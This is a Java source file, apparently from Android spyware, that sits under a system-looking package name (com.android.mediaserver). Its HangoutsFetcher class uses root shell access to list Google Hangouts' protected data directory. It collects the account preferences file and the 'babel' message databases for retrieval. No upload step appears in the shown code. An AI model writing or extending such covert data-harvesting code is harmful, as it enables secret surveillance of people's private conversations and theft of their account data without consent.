package com.android.mediaserver.fetchers.apps;

import com.android.mediaserver.fetchers.FetchedFile;
import com.android.mediaserver.fetchers.file.FileFetcher;
import com.android.mediaserver.shell.Shell.SU;
import java.io.File;
import java.util.ArrayList;
import java.util.List;

public class HangoutsFetcher extends FileFetcher {
  public HangoutsFetcher() {
    this.mFetchedFiles = new ArrayList();
    this.mFetchedFiles.add(
        new FetchedFile(new File("/data/data/com.google.android.talk/shared_prefs/accounts.xml"),
            "APP", "hangouts"));
    List<String> res = SU.run("ls /data/data/com.google.android.talk/databases/");
    if (res != null) {
      for (String db : res) {
        if (true == db.contains("babel") && !db.contains("journal")) {
          this.mFetchedFiles.add(
              new FetchedFile(new File("/data/data/com.google.android.talk/databases/" + db), "APP",
                  "hangouts"));
        }
      }
    }
  }
}
